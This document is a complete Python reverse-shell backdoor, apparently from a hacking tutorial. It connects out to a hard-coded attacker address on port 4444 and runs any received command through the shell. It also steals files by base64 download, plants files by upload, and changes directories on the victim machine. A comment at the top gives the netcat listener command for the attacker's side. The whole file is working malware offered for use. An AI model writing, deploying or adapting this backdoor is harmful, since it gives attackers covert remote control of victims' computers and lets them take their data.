# Open a listening port on your machine with netcad: nc -vv -l -p 4444

import socket
import subprocess
import json
import sys
import os
import base64

class Backdoor:

    def __init__(self, ip, port):
        # Connection between the backdoor and the ATTACKER machine
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.connection.connect((ip, port))
        except ConnectionRefusedError:
            print("[-] Connection could not be established: Port closed.")


    def execute(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
        

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_pwd(self, path):
        os.chdir(path)

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] Upload successful."

    def run(self):
        while True:
            # Wait for a command to be received from the attacker machine.
            received_data = self.reliable_receive()

            try:
                if received_data[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif received_data[0] == "cd" and len(received_data) > 1:
                    command_output = self.change_pwd(received_data[1])
                elif received_data[0] == "download":
                    command_output = self.read_file(received_data[1]).decode()
                elif received_data[0] == "upload":
                    command_output = self.write_file(received_data[1], received_data[2])
                else:
                    try:
                        command_output = self.execute(received_data).decode()
                    except UnicodeDecodeError:
                        command_output = str(self.execute(received_data))
            except Exception as e:
               command_output = "[-] Error(s) occured during execution."

            self.reliable_send(command_output)

backdoor = Backdoor('192.168.217.138', 4444)
backdoor.run()